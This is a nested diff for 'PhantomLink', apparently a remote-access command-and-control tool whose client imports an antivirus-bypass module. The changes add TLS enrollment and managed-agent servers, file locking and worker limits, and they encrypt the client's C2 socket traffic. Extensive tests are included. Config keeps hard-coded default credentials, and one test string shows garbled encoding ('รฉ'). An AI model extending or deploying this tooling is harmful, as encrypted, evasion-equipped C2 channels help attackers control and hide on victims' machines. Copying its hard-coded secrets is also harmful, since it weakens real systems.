@@ -1,13 +1,14 @@
 diff --git a/.env.example b/.env.example
-index b409211..8c88c50 100644
+index b409211..d378b6a 100644
 --- a/.env.example
 +++ b/.env.example
-@@ -11,6 +11,13 @@ PHANTOMLINK_SERVER_IP=81.10.55.8
+@@ -11,6 +11,14 @@ PHANTOMLINK_SERVER_IP=81.10.55.8
  PHANTOMLINK_HOST=0.0.0.0
  PHANTOMLINK_PORT=5000
  
 +# Optional managed TLS and enrollment listeners (disabled until both files exist)
 +PHANTOMLINK_MANAGED_PORT=5443
++PHANTOMLINK_MANAGED_HOST=127.0.0.1
 +PHANTOMLINK_ENROLLMENT_PORT=5444
 +PHANTOMLINK_TLS_CERT=
 +PHANTOMLINK_TLS_KEY=
@@ -17,10 +18,10 @@ index b409211..8c88c50 100644
  PHANTOMLINK_API_KEY=PhantomLink-API-2026
  PHANTOMLINK_PASSWORD=PhantomLink
 diff --git a/C2/C2.py b/C2/C2.py
-index d09f032..26e0d95 100644
+index d09f032..43b6e10 100644
 --- a/C2/C2.py
 +++ b/C2/C2.py
-@@ -14,18 +14,44 @@ import json
+@@ -14,18 +14,45 @@ import json
  from urllib.parse import urlparse, parse_qs
  import sys
  sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -31,6 +32,7 @@ index d09f032..26e0d95 100644
 +    DISCORD_WEBHOOK,
 +    ENROLLMENT_PORT,
 +    MANAGED_PORT,
++    MANAGED_HOST,
 +    MANAGED_STORE,
 +    MANAGED_TLS_CERT,
 +    MANAGED_TLS_KEY,
@@ -66,7 +68,7 @@ index d09f032..26e0d95 100644
  
  version = 11.7 #7/3/2026
  
-@@ -285,9 +311,11 @@ class ClientManager:
+@@ -285,9 +312,11 @@ class ClientManager:
              return client_id in self.clients and self.clients[client_id]['active']
  
      def _send_message(self, conn, data):
@@ -80,7 +82,7 @@ index d09f032..26e0d95 100644
              conn.sendall(length_packet)
              conn.sendall(payload)
              return True
-@@ -297,7 +325,10 @@ class ClientManager:
+@@ -297,7 +326,10 @@ class ClientManager:
  
      def _recv_message(self, conn):
          try:
@@ -92,7 +94,7 @@ index d09f032..26e0d95 100644
          except Exception:
              return None
  
-@@ -851,6 +882,43 @@ def interact_with_client(client_manager, client_id):
+@@ -851,6 +883,43 @@ def interact_with_client(client_manager, client_id):
  
  def main():
      client_manager = ClientManager()
@@ -136,7 +138,7 @@ index d09f032..26e0d95 100644
  
      try:
          from dashboard import start_dashboard
-@@ -894,6 +962,54 @@ def main():
+@@ -894,6 +963,54 @@ def main():
          print(f"[!] Failed to setup server: {e}")
          return
  
@@ -152,14 +154,14 @@ index d09f032..26e0d95 100644
 +                EnrollmentStore(os.path.join(MANAGED_STORE, "tokens.json")), registry
 +            )
 +            managed_server = ManagedServer(
-+                HOST,
++                MANAGED_HOST,
 +                MANAGED_PORT,
 +                MANAGED_TLS_CERT,
 +                MANAGED_TLS_KEY,
 +                registry,
 +            )
 +            enrollment_server = EnrollmentServer(
-+                HOST,
++                MANAGED_HOST,
 +                ENROLLMENT_PORT,
 +                MANAGED_TLS_CERT,
 +                MANAGED_TLS_KEY,
@@ -173,8 +175,8 @@ index d09f032..26e0d95 100644
 +            )
 +            enrollment_thread.start()
 +            print(
-+                f"[+] Managed TLS on {HOST}:{MANAGED_PORT}; "
-+                f"enrollment HTTPS on {HOST}:{ENROLLMENT_PORT}"
++                f"[+] Managed TLS on {MANAGED_HOST}:{MANAGED_PORT}; "
++                f"enrollment HTTPS on {MANAGED_HOST}:{ENROLLMENT_PORT}"
 +            )
 +        except Exception as e:
 +            cleanup_errors = cleanup_managed_services()
@@ -191,7 +193,7 @@ index d09f032..26e0d95 100644
      print(f"\n[+] Listening on {HOST}:{PORT}")
      threading.Thread(target=broadcast_c2_beacon, daemon=True).start()
  
-@@ -1270,6 +1386,8 @@ def main():
+@@ -1270,6 +1387,8 @@ def main():
      finally:
          # Cleanup
          print("[+] Cleaning up...")
@@ -211,12 +213,53 @@ index 0000000..f712a3c
 +from client.transport import decrypt, derive_key, encrypt
 +
 +__all__ = ["derive_key", "encrypt", "decrypt"]
+diff --git a/C2/dashboard.py b/C2/dashboard.py
+index aaa395e..31227ea 100644
+--- a/C2/dashboard.py
++++ b/C2/dashboard.py
+@@ -140,6 +140,7 @@ def build_app(
+     """Factory so the Textual import stays lazy and testable."""
+     from textual.app import App, ComposeResult
+     from textual.containers import Vertical
++    from textual.css.query import NoMatches
+     from textual.widgets import DataTable, Footer, Header, Static
+ 
+     class C2DashboardApp(App):
+@@ -175,13 +176,17 @@ def build_app(
+             self._refresh()
+ 
+         def _refresh(self) -> None:
++            try:
++                table = self.query_one("#clients", DataTable)
++                status = self.query_one("#status", Static)
++            except NoMatches:
++                return
+             try:
+                 rows = self._data.refresh_if_stale()
+                 summary = self._data.summary()
+             except Exception as exc:  # defensive: never let the loop die
+-                self.query_one("#status", Static).update(f"[red]snapshot error: {exc}[/red]")
++                status.update(f"[red]snapshot error: {exc}[/red]")
+                 return
+-            table = self.query_one("#clients", DataTable)
+             table.clear()
+             for row in rows:
+                 state = "ON" if row.connected else "off"
+@@ -191,7 +196,7 @@ def build_app(
+                     row.quality, str(row.total_commands), state,
+                 )
+             uptime = int(time.time() - self._started)
+-            self.query_one("#status", Static).update(
++            status.update(
+                 f"[bold cyan]Uptime {uptime}s[/bold cyan] | "
+                 f"Total [bold]{int(summary['total'])}[/bold] | "
+                 f"Connected [bold green]{int(summary['connected'])}[/bold green] | "
 diff --git a/C2/managed_auth.py b/C2/managed_auth.py
 new file mode 100644
-index 0000000..4c67c88
+index 0000000..feaded5
 --- /dev/null
 +++ b/C2/managed_auth.py
-@@ -0,0 +1,951 @@
+@@ -0,0 +1,1053 @@
 +from __future__ import annotations
 +
 +import argparse
@@ -231,6 +274,7 @@ index 0000000..4c67c88
 +import socket
 +import ssl
 +import threading
++import errno
 +from collections.abc import Callable, Mapping
 +from pathlib import Path
 +from time import monotonic, time
@@ -261,6 +305,74 @@ index 0000000..4c67c88
 +
 +_MAX_JSON_SIZE = 64 * 1024
 +_MAX_ID_SIZE = 128
++_PROCESS_LOCK_TIMEOUT = 5.0
++_local_locks_guard = threading.Lock()
++_local_locks = {}
++
++
++class _ProcessFileLock:
++    """Serialize one store across threads and processes without dependencies."""
++
++    def __init__(self, data_path, timeout=_PROCESS_LOCK_TIMEOUT):
++        self.path = Path(f"{data_path}.lock")
++        self.timeout = timeout
++        key = str(self.path.resolve())
++        with _local_locks_guard:
++            self._thread_lock = _local_locks.setdefault(key, threading.Lock())
++        self._file = None
++        self.path.parent.mkdir(parents=True, exist_ok=True)
++        with self.path.open("a+b") as lock_file:
++            if lock_file.tell() == 0:
++                lock_file.write(b"\0")
++                lock_file.flush()
++
++    def __enter__(self):
++        if not self._thread_lock.acquire(timeout=self.timeout):
++            raise TimeoutError("store lock timed out")
++        try:
++            self._file = self.path.open("r+b")
++            deadline = monotonic() + self.timeout
++            while True:
++                try:
++                    self._lock_byte()
++                    return self
++                except OSError as exc:
++                    if exc.errno not in (errno.EACCES, errno.EAGAIN, 13, 36) or monotonic() >= deadline:
++                        raise TimeoutError("store lock timed out") from exc
++                    threading.Event().wait(min(0.01, deadline - monotonic()))
++        except Exception:
++            if self._file is not None:
++                self._file.close()
++                self._file = None
++            self._thread_lock.release()
++            raise
++
++    def _lock_byte(self):
++        self._file.seek(0)
++        if os.name == "nt":
++            import msvcrt
++
++            msvcrt.locking(self._file.fileno(), msvcrt.LK_NBLCK, 1)
++        else:
++            import fcntl
++
++            fcntl.flock(self._file.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
++
++    def __exit__(self, *_):
++        try:
++            self._file.seek(0)
++            if os.name == "nt":
++                import msvcrt
++
++                msvcrt.locking(self._file.fileno(), msvcrt.LK_UNLCK, 1)
++            else:
++                import fcntl
++
++                fcntl.flock(self._file.fileno(), fcntl.LOCK_UN)
++        finally:
++            self._file.close()
++            self._file = None
++            self._thread_lock.release()
 +
 +
 +def _recv_exactly(conn, size: int) -> bytes:
@@ -313,7 +425,7 @@ index 0000000..4c67c88
 +    ) -> None:
 +        self.path = Path(path)
 +        self._now = now
-+        self._lock = threading.Lock()
++        self._lock = _ProcessFileLock(self.path)
 +        self._needs_migration = False
 +        self._acl_inspector = acl_inspector
 +        self._acl_applier = acl_applier or _apply_private_acl
@@ -450,7 +562,7 @@ index 0000000..4c67c88
 +        self.path = Path(path)
 +        self._test_boundary = protector is not None
 +        self._protector = protector or _DpapiProtector()
-+        self._lock = threading.Lock()
++        self._lock = _ProcessFileLock(self.path)
 +        self._needs_migration = False
 +        self._acl_inspector = acl_inspector
 +        self._acl_applier = (
@@ -735,6 +847,8 @@ index 0000000..4c67c88
 +        initial_ping_delay: float = 10.0,
 +        ping_interval: float = 30.0,
 +        pong_timeout: float = 10.0,
++        max_workers: int = 32,
++        handshake_timeout: float = 0.5,
 +    ) -> None:
 +        for name, value in (
 +            ("initial_ping_delay", initial_ping_delay),
@@ -753,6 +867,12 @@ index 0000000..4c67c88
 +        self._initial_ping_delay = initial_ping_delay
 +        self._ping_interval = ping_interval
 +        self._pong_timeout = pong_timeout
++        if type(max_workers) is not int or max_workers <= 0:
++            raise ValueError("max_workers must be positive")
++        if not isinstance(handshake_timeout, (int, float)) or handshake_timeout <= 0:
++            raise ValueError("handshake_timeout must be positive")
++        self._handshake_timeout = handshake_timeout
++        self._worker_slots = threading.BoundedSemaphore(max_workers)
 +        self._stopped = threading.Event()
 +        self._lock = threading.Lock()
 +        self._startup = threading.Condition()
@@ -808,11 +928,14 @@ index 0000000..4c67c88
 +                    continue
 +                except OSError:
 +                    break
++                if not self._worker_slots.acquire(blocking=False):
++                    conn.close()
++                    continue
 +                thread = threading.Thread(
 +                    target=self._serve_connection,
 +                    args=(conn,),
 +                    name="managed-session",
-+                    daemon=False,
++                    daemon=True,
 +                )
 +                with self._lock:
 +                    if self._stopped.is_set() or stop_event.is_set():
@@ -827,7 +950,7 @@ index 0000000..4c67c88
 +    def _serve_connection(self, raw_conn: socket.socket) -> None:
 +        conn = raw_conn
 +        try:
-+            raw_conn.settimeout(10.0)
++            raw_conn.settimeout(self._handshake_timeout)
 +            conn = self._context.wrap_socket(raw_conn, server_side=True)
 +            with self._lock:
 +                self._connections.discard(raw_conn)
@@ -847,6 +970,7 @@ index 0000000..4c67c88
 +                self._connections.discard(raw_conn)
 +                self._connections.discard(conn)
 +                self._threads.discard(threading.current_thread())
++            self._worker_slots.release()
 +
 +    def _authenticate_and_heartbeat(self, conn) -> None:
 +        try:
@@ -964,11 +1088,11 @@ index 0000000..4c67c88
 +
 +
 +class _EnrollmentHTTPServer(http.server.ThreadingHTTPServer):
-+    daemon_threads = False
-+    block_on_close = True
++    daemon_threads = True
++    block_on_close = False
 +
 +    def __init__(
-+        self, address, handler, context, enrollment_service, handshake_timeout
++        self, address, handler, context, enrollment_service, handshake_timeout, max_workers
 +    ):
 +        self._context = context
 +        self.enrollment_service = enrollment_service
@@ -976,7 +1100,24 @@ index 0000000..4c67c88
 +        self._closing = threading.Event()
 +        self._connections = set()
 +        self._connections_lock = threading.Lock()
++        self._worker_slots = threading.BoundedSemaphore(max_workers)
 +        super().__init__(address, handler)
++
++    def process_request(self, request, client_address):
++        if not self._worker_slots.acquire(blocking=False):
++            self.shutdown_request(request)
++            return
++        try:
++            super().process_request(request, client_address)
++        except BaseException:
++            self._worker_slots.release()
++            raise
++
++    def process_request_thread(self, request, client_address):
++        try:
++            super().process_request_thread(request, client_address)
++        finally:
++            self._worker_slots.release()
 +
 +    def get_request(self):
 +        conn, address = super().get_request()
@@ -1103,7 +1244,10 @@ index 0000000..4c67c88
 +        service: EnrollmentService,
 +        *,
 +        handshake_timeout: float = 10.0,
++        max_workers: int = 32,
 +    ) -> None:
++        if type(max_workers) is not int or max_workers <= 0:
++            raise ValueError("max_workers must be positive")
 +        if (
 +            not isinstance(handshake_timeout, (int, float))
 +            or isinstance(handshake_timeout, bool)
@@ -1117,6 +1261,7 @@ index 0000000..4c67c88
 +            _server_context(certfile, keyfile),
 +            service,
 +            handshake_timeout,
++            max_workers,
 +        )
 +        self.port = self._server.server_address[1]
 +
@@ -1168,6 +1313,71 @@ index 0000000..4c67c88
 +
 +if __name__ == "__main__":
 +    raise SystemExit(_main())
+diff --git a/client/PhantomLink.py b/client/PhantomLink.py
+index 0f2b905..cf486b2 100644
+--- a/client/PhantomLink.py
++++ b/client/PhantomLink.py
+@@ -15,6 +15,17 @@ _CLIENT_DIR = os.path.dirname(os.path.abspath(__file__))
+ if _CLIENT_DIR not in sys.path:
+     sys.path.insert(0, _CLIENT_DIR)
+ 
++if __package__:
++    from . import transport as _transport
++else:
++    import transport as _transport
++
++MAX_FRAME_SIZE = _transport.MAX_FRAME_SIZE
++_decrypt = _transport.decrypt
++_derive_key = _transport.derive_key
++encode_message = _transport.encode_message
++_encrypt = _transport.encrypt
++
+ try:
+     from av_bypass import AVBypass
+ except ImportError:
+@@ -802,14 +813,11 @@ class ShellClient:
+         """Send data with length prefix (thread-safe)"""
+         with self.send_lock:
+             try:
+-                if isinstance(data, str):
+-                    data = data.encode('utf-8')
+-
+-                # Send length (4 bytes)
+-                msg_len = len(data)
+-                self.socket.sendall(struct.pack('!I', msg_len))
+-                # Send data
+-                self.socket.sendall(data)
++                length_packet, payload = encode_message(
++                    _encrypt(_derive_key(CLIENT_PASSWORD), data)
++                )
++                self.socket.sendall(length_packet)
++                self.socket.sendall(payload)
+                 return True
+ 
+             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+@@ -835,12 +843,12 @@ class ShellClient:
+ 
+                 msglen = struct.unpack('!I', raw_msglen)[0]
+ 
+-                if msglen > 10 * 1024 * 1024:  # 10MB limit
++                if msglen > MAX_FRAME_SIZE:
+                     print(f"[!] Message too large: {msglen} bytes")
+                     return None
+ 
+-                # Receive the actual message
+-                return self._recv_exactly(msglen)
++                payload = self._recv_exactly(msglen)
++                return _decrypt(_derive_key(CLIENT_PASSWORD), payload)
+ 
+             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+                 print(f"[!] Connection error while receiving")
+@@ -1309,4 +1317,4 @@ def main():
+ 
+ 
+ if __name__ == "__main__":
+-    main()
+\ No newline at end of file
++    main()
 diff --git a/client/agent_config.py b/client/agent_config.py
 new file mode 100644
 index 0000000..88c7c34
@@ -2201,10 +2411,10 @@ index 0000000..956aa50
 +                self._run_lock.release()
 diff --git a/client/managed_agent.py b/client/managed_agent.py
 new file mode 100644
-index 0000000..910a85e
+index 0000000..7101ba2
 --- /dev/null
 +++ b/client/managed_agent.py
-@@ -0,0 +1,280 @@
+@@ -0,0 +1,285 @@
 +from __future__ import annotations
 +
 +import argparse
@@ -2465,7 +2675,12 @@ index 0000000..910a85e
 +            auth_rejected = auth_rejected or event.get("event") == "AUTH_REJECTED"
 +            logging_runtime.emit(event)
 +
-+        AgentRuntime(config, credential, event_sink=observe).run()
++        runtime = AgentRuntime(config, credential, event_sink=observe)
++        try:
++            runtime.run()
++        except KeyboardInterrupt:
++            runtime.stop()
++            return 0
 +        return 5 if auth_rejected else 0
 +    except (AuthRejected, ValueError):
 +        logging_runtime.emit(
@@ -2607,10 +2822,17 @@ index 0000000..4b703e8
 +            del self.buffer[: self.expected]
 +            self.expected = None
 diff --git a/config.py b/config.py
-index 898cce2..aeb33a7 100644
+index 898cce2..9fbd4fa 100644
 --- a/config.py
 +++ b/config.py
-@@ -13,6 +13,7 @@ for _env_candidate in _possible_env_paths:
+@@ -1,5 +1,6 @@
+ import os
+ import sys
++import ipaddress
+ 
+ # Automatically load .env file from working directory, exe directory, or script directory
+ _possible_env_paths = [
+@@ -13,6 +14,7 @@ for _env_candidate in _possible_env_paths:
      if os.path.exists(_env_candidate):
          try:
              from dotenv import load_dotenv
@@ -2618,7 +2840,7 @@ index 898cce2..aeb33a7 100644
              load_dotenv(_env_candidate, override=True)
          except ImportError:
              with open(_env_candidate, "r", encoding="utf-8") as f:
-@@ -29,10 +30,15 @@ for _env_candidate in _possible_env_paths:
+@@ -29,10 +31,21 @@ for _env_candidate in _possible_env_paths:
  DISCORD_WEBHOOK = os.getenv("PHANTOMLINK_WEBHOOK", "")
  DISCORD_BOT_TOKEN = os.getenv("PHANTOMLINK_BOT_TOKEN", "")
  
@@ -2629,18 +2851,36 @@ index 898cce2..aeb33a7 100644
  SERVER_PORT = int(os.getenv("PHANTOMLINK_PORT", "5000"))
 +MANAGED_PORT = int(os.getenv("PHANTOMLINK_MANAGED_PORT", "5443"))
 +ENROLLMENT_PORT = int(os.getenv("PHANTOMLINK_ENROLLMENT_PORT", "5444"))
++MANAGED_HOST = os.getenv("PHANTOMLINK_MANAGED_HOST", "127.0.0.1")
++try:
++    if not ipaddress.ip_address(MANAGED_HOST).is_loopback:
++        raise ValueError
++except ValueError as exc:
++    raise ValueError("PHANTOMLINK_MANAGED_HOST must be a loopback IP address") from exc
 +MANAGED_TLS_CERT = os.getenv("PHANTOMLINK_TLS_CERT", "")
 +MANAGED_TLS_KEY = os.getenv("PHANTOMLINK_TLS_KEY", "")
 +MANAGED_STORE = os.getenv("PHANTOMLINK_MANAGED_STORE", "managed-store")
  
  # API Configuration
  API_KEY = os.getenv("PHANTOMLINK_API_KEY", "PhantomLink-API-2026")
+diff --git a/requirements.txt b/requirements.txt
+index cf1f34a..7e5ca86 100644
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -5,6 +5,7 @@ pywin32>=306; sys_platform == 'win32'
+ psutil>=5.9,<6
+ pyautogui>=0.9,<1
+ cryptography>=41,<42
++PyNaCl>=1.5,<2
+ pillow>=10,<11
+ pynput>=1.7,<2
+ numpy>=1.26,<2; sys_platform == 'win32'
 diff --git a/tests/test_agent_config.py b/tests/test_agent_config.py
 new file mode 100644
-index 0000000..26208d1
+index 0000000..a5786eb
 --- /dev/null
 +++ b/tests/test_agent_config.py
-@@ -0,0 +1,583 @@
+@@ -0,0 +1,622 @@
 +import base64
 +import hashlib
 +import json
@@ -3143,6 +3383,45 @@ index 0000000..26208d1
 +    monkeypatch.setattr(managed_agent, "AgentRuntime", RejectedRuntime)
 +
 +    assert managed_agent.main(["run", "--config", str(tmp_path / "agent.json")]) == 5
++
++
++def test_ctrl_c_stops_runtime_and_flushes_logging(tmp_path, monkeypatch):
++    from client import managed_agent
++    from client.agent_config import AgentConfig, DeviceCredential
++
++    config = AgentConfig.from_mapping(valid_config(tmp_path))
++    stopped = []
++    flushed = []
++
++    class Store:
++        def load(self):
++            return DeviceCredential("agent", "key", b"s" * 32)
++
++    class InterruptedRuntime:
++        def __init__(self, *_args, **_kwargs):
++            pass
++
++        def run(self):
++            raise KeyboardInterrupt
++
++        def stop(self):
++            stopped.append(True)
++
++    class Logging:
++        def emit(self, _event):
++            pass
++
++        def stop(self, timeout):
++            flushed.append(timeout)
++
++    monkeypatch.setattr(managed_agent, "load_config", lambda _: config)
++    monkeypatch.setattr(managed_agent, "DpapiCredentialStore", lambda _: Store())
++    monkeypatch.setattr(managed_agent, "AgentRuntime", InterruptedRuntime)
++    monkeypatch.setattr(managed_agent, "start_agent_logging", lambda _: Logging())
++
++    assert managed_agent.main(["run", "--config", str(tmp_path / "agent.json")]) == 0
++    assert stopped == [True]
++    assert flushed == [1.0]
 +
 +
 +def test_token_file_uses_same_handle_reader_and_deletes_file(tmp_path, monkeypatch):
@@ -4722,6 +5001,65 @@ index 0000000..b1deb94
 +    proof = build_proof(secret, 1, "agent", "key", b"nonce-a")
 +    assert verify_proof(secret, 1, "agent", "key", b"nonce-a", proof)
 +    assert not verify_proof(secret, 1, "agent", "key", b"nonce-b", proof)
+diff --git a/tests/test_commands_registry.py b/tests/test_commands_registry.py
+index 8743d15..6274860 100644
+--- a/tests/test_commands_registry.py
++++ b/tests/test_commands_registry.py
+@@ -5,14 +5,11 @@ handler return contracts, and — critically — byte-exact regression guards
+ that pin the CMD payloads to the values the legacy elif blocks sent, so a
+ future refactor can never silently change what is transmitted to clients.
+ """
+-import sys
+ from unittest.mock import MagicMock, patch
+ 
+ import pytest
+ 
+-sys.path.insert(0, "C2")
+-
+-from commands import (  # noqa: E402
++from C2.commands import (
+     CATEGORY_MEDIA,
+     CATEGORY_NETWORK,
+     CATEGORY_SYSTEM_CONTROL,
+diff --git a/tests/test_dashboard.py b/tests/test_dashboard.py
+index 2557fa3..436aca4 100644
+--- a/tests/test_dashboard.py
++++ b/tests/test_dashboard.py
+@@ -4,15 +4,12 @@ The data layer is pure and synchronous — tested directly. The Textual app is
+ exercised headlessly through App.run_test() inside asyncio.run, so no real
+ terminal, no sockets, and no hanging.
+ """
+-import sys
+ import threading
+ import time
+ 
+ import pytest
+ 
+-sys.path.insert(0, "C2")
+-
+-from dashboard import DashboardData, build_app  # noqa: E402
++from C2.dashboard import DashboardData, build_app
+ 
+ 
+ def make_health(latency=0.0, quality="good", total=0):
+@@ -138,6 +135,17 @@ class TestDashboardData:
+ 
+ 
+ class TestDashboardApp:
++    def test_late_refresh_after_teardown_is_contained(self):
++        import asyncio
++
++        async def run():
++            app = build_app(DashboardData(snapshot_fn=sample_snapshot), refresh_interval=0.05)
++            async with app.run_test(size=(80, 24)) as pilot:
++                await pilot.pause()
++            app._refresh()
++
++        asyncio.run(run())
++
+     def test_headless_app_builds_table(self):
+         import asyncio
+ 
 diff --git a/tests/test_encryption.py b/tests/test_encryption.py
 new file mode 100644
 index 0000000..285448c
@@ -4886,16 +5224,20 @@ index 0000000..285448c
 +    unittest.main()
 diff --git a/tests/test_managed_auth.py b/tests/test_managed_auth.py
 new file mode 100644
-index 0000000..0254dc1
+index 0000000..53e4215
 --- /dev/null
 +++ b/tests/test_managed_auth.py
-@@ -0,0 +1,1120 @@
+@@ -0,0 +1,1260 @@
 +import base64
 +import hashlib
 +import http.client
 +import json
++import multiprocessing
++import os
 +import socket
 +import ssl
++import subprocess
++import sys
 +import threading
 +from concurrent.futures import ThreadPoolExecutor
 +from datetime import datetime, timedelta, timezone
@@ -4920,6 +5262,20 @@ index 0000000..0254dc1
 +    send_json_frame,
 +    verify_proof,
 +)
++
++
++def _issue_tokens_in_process(path, start, count):
++    store = EnrollmentStore(path, acl_inspector=lambda _: {"owner": True}, acl_applier=lambda _: None)
++    start.wait(5)
++    for _ in range(count):
++        store.issue(60)
++
++
++def _consume_token_in_process(path, start, token):
++    store = EnrollmentStore(path, acl_inspector=lambda _: {"owner": True}, acl_applier=lambda _: None)
++    start.wait(5)
++    if not store.consume(token):
++        raise AssertionError("token was not consumed")
 +
 +
 +class FakeProtector:
@@ -5111,7 +5467,7 @@ index 0000000..0254dc1
 +        "a" * 43 + "=",
 +        "+" + "a" * 42,
 +        "/" + "a" * 42,
-+        "é" * 43,
++        "รฉ" * 43,
 +        base64.urlsafe_b64encode(b"x" * 32).rstrip(b"=").decode("ascii")[:-1] + "h",
 +    ],
 +)
@@ -5863,6 +6219,64 @@ index 0000000..0254dc1
 +    assert not thread.is_alive()
 +
 +
++def test_managed_unauthenticated_workers_are_bounded(tls_material, tmp_path):
++    cert, key = tls_material
++    server = ManagedServer(
++        "127.0.0.1",
++        0,
++        cert,
++        key,
++        DeviceRegistry(tmp_path / "devices.bin", FakeProtector()),
++        max_workers=2,
++        handshake_timeout=0.5,
++    )
++    stop = threading.Event()
++    thread = server.start(stop)
++    stalled = [socket.create_connection(("127.0.0.1", server.port), timeout=0.5) for _ in range(8)]
++    try:
++        assert _wait_until(lambda: len(server._threads) == 2)
++        assert len(server._threads) <= 2
++        started = monotonic()
++        server.stop(timeout=1)
++        assert monotonic() - started < 1.1
++        assert not any(worker.is_alive() for worker in server._threads)
++    finally:
++        for conn in stalled:
++            conn.close()
++        stop.set()
++        server.stop(timeout=1)
++        thread.join(1)
++
++
++def test_enrollment_unauthenticated_workers_are_bounded(tls_material, tmp_path):
++    cert, key = tls_material
++    service = EnrollmentService(
++        EnrollmentStore(tmp_path / "tokens.json", acl_applier=lambda _: None),
++        DeviceRegistry(tmp_path / "devices.bin", FakeProtector()),
++    )
++    server = EnrollmentServer(
++        "127.0.0.1", 0, cert, key, service, handshake_timeout=0.5, max_workers=2
++    )
++    thread = threading.Thread(target=server.serve_forever)
++    thread.start()
++    stalled = [socket.create_connection(("127.0.0.1", server.port), timeout=0.5) for _ in range(8)]
++    try:
++        assert _wait_until(lambda: len(server._server._connections) == 2)
++        assert len(server._server._connections) <= 2
++        started = monotonic()
++        server.shutdown()
++        server.server_close()
++        thread.join(1)
++        assert monotonic() - started < 1.1
++        assert not thread.is_alive()
++    finally:
++        for conn in stalled:
++            conn.close()
++        server.shutdown()
++        server.server_close()
++        thread.join(1)
++
++
 +def test_operator_cli_prints_token_once_and_not_found_is_nonzero(tmp_path, capsys):
 +    store = tmp_path / "store"
 +
@@ -5890,6 +6304,43 @@ index 0000000..0254dc1
 +    assert capsys.readouterr().out.strip() == "not found"
 +
 +
++def test_cross_process_token_issues_do_not_lose_updates(tmp_path):
++    context = multiprocessing.get_context("spawn")
++    start = context.Event()
++    path = tmp_path / "tokens.json"
++    processes = [
++        context.Process(target=_issue_tokens_in_process, args=(path, start, 5))
++        for _ in range(6)
++    ]
++    for process in processes:
++        process.start()
++    start.set()
++    for process in processes:
++        process.join(10)
++        assert process.exitcode == 0
++    records = EnrollmentStore(
++        path, acl_inspector=lambda _: {"owner": True}, acl_applier=lambda _: None
++    )._read_unlocked()
++    assert len(records) == 30
++
++
++def test_cross_process_issue_cannot_resurrect_consumed_token(tmp_path):
++    context = multiprocessing.get_context("spawn")
++    path = tmp_path / "tokens.json"
++    store = EnrollmentStore(path, acl_inspector=lambda _: {"owner": True}, acl_applier=lambda _: None)
++    token_a = store.issue(60)
++    start = context.Event()
++    consume = context.Process(target=_consume_token_in_process, args=(path, start, token_a))
++    issue = context.Process(target=_issue_tokens_in_process, args=(path, start, 10))
++    consume.start()
++    issue.start()
++    start.set()
++    consume.join(10)
++    issue.join(10)
++    assert consume.exitcode == issue.exitcode == 0
++    assert store.consume(token_a) is False
++
++
 +def test_controller_keeps_managed_services_disabled_without_certificates(capsys):
 +    import C2.C2 as controller
 +
@@ -5909,6 +6360,30 @@ index 0000000..0254dc1
 +    assert thread_type.called
 +
 +
++def test_managed_bind_host_defaults_to_loopback_and_rejects_non_loopback():
++    environment = os.environ.copy()
++    environment.pop("PHANTOMLINK_MANAGED_HOST", None)
++    default = subprocess.run(
++        [sys.executable, "-c", "import config; print(config.MANAGED_HOST)"],
++        env=environment,
++        capture_output=True,
++        text=True,
++        check=False,
++    )
++    assert default.returncode == 0
++    assert default.stdout.strip() == "127.0.0.1"
++    environment["PHANTOMLINK_MANAGED_HOST"] = "0.0.0.0"
++    invalid = subprocess.run(
++        [sys.executable, "-c", "import config"],
++        env=environment,
++        capture_output=True,
++        text=True,
++        check=False,
++    )
++    assert invalid.returncode != 0
++    assert "must be a loopback IP address" in invalid.stderr
++
++
 +def test_controller_starts_and_cleans_up_managed_services(tls_material, tmp_path):
 +    import C2.C2 as controller
 +
@@ -5916,12 +6391,13 @@ index 0000000..0254dc1
 +    legacy_socket = MagicMock()
 +    managed = MagicMock()
 +    enrollment = MagicMock()
++    bind_hosts = []
 +    with (
 +        patch.object(controller, "MANAGED_TLS_CERT", str(cert)),
 +        patch.object(controller, "MANAGED_TLS_KEY", str(key)),
 +        patch.object(controller, "MANAGED_STORE", str(tmp_path / "store")),
-+        patch.object(controller, "ManagedServer", return_value=managed),
-+        patch.object(controller, "EnrollmentServer", return_value=enrollment),
++        patch.object(controller, "ManagedServer", side_effect=lambda host, *_a: (bind_hosts.append(host), managed)[1]),
++        patch.object(controller, "EnrollmentServer", side_effect=lambda host, *_a: (bind_hosts.append(host), enrollment)[1]),
 +        patch.object(controller, "EnrollmentStore"),
 +        patch.object(controller, "DeviceRegistry"),
 +        patch.object(controller, "EnrollmentService"),
@@ -5935,6 +6411,7 @@ index 0000000..0254dc1
 +    managed.stop.assert_called_once_with(timeout=5)
 +    enrollment.shutdown.assert_called_once_with()
 +    enrollment.server_close.assert_called_once_with()
++    assert bind_hosts == [controller.MANAGED_HOST, controller.MANAGED_HOST]
 +    legacy_socket.close.assert_called_once_with()
 +
 +
@@ -6010,3 +6487,76 @@ index 0000000..0254dc1
 +    ]
 +    assert len(managed_threads) == 2
 +    assert all(thread.joined for thread in managed_threads)
++
+diff --git a/tests/test_phantomlink_config_import.py b/tests/test_phantomlink_config_import.py
+new file mode 100644
+index 0000000..9f9f540
+--- /dev/null
++++ b/tests/test_phantomlink_config_import.py
+@@ -0,0 +1,44 @@
++import subprocess
++import sys
++
++
++def _run_isolated(code):
++    return subprocess.run(
++        [sys.executable, "-c", code],
++        check=False,
++        capture_output=True,
++        text=True,
++    )
++
++
++def test_config_import_falls_back_when_root_config_is_missing():
++    result = _run_isolated(
++        "import sys; "
++        "sys.modules['config'] = None; "
++        "import client.PhantomLink as phantom; "
++        "assert hasattr(phantom, 'DISCORD_WEBHOOK'); "
++        "assert phantom.DISCORD_WEBHOOK is not None"
++    )
++    assert result.returncode == 0, result.stderr
++
++
++def test_transport_import_does_not_import_phantomlink():
++    result = _run_isolated(
++        "import sys; import client.transport; "
++        "assert 'client.PhantomLink' not in sys.modules"
++    )
++    assert result.returncode == 0, result.stderr
++
++
++def test_missing_transitive_dependency_is_not_mislabeled_as_transport():
++    result = _run_isolated(
++        "import builtins; "
++        "original = builtins.__import__; "
++        "builtins.__import__ = lambda name, *a, **k: "
++        "(_ for _ in ()).throw(ModuleNotFoundError(\"No module named 'nacl'\", name='nacl')) "
++        "if name == 'nacl.exceptions' else original(name, *a, **k); "
++        "import client.PhantomLink"
++    )
++    assert result.returncode != 0
